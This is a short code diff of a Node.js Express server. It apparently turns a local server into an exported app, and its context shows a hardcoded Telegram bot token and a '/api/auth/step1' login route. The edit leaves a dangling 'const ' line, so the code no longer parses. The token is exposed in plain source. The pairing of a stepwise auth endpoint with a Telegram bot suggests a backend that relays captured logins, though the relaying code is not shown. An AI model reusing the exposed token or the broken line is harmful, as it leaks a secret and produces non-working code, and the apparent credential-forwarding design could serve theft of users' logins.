@@ -4,7 +4,7 @@ const path = require('path');
 const bodyParser = require('body-parser');
 
 const app = express();
-const PORT = process.env.PORT || 4117;
+const 
 
 // ================= [ CONFIG OWNER - GANTI DI SINI ] =================
 const TELEGRAM_BOT_TOKEN = "8267005822:AAFewSAQUyQuvOUUbr3mVrjvQHZWyfBsBgo"; // Token Bot Telegram
@@ -49,4 +49,4 @@ app.post('/api/auth/step1', async (req, res) => {
     }
 });
 
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+module.exports = app;
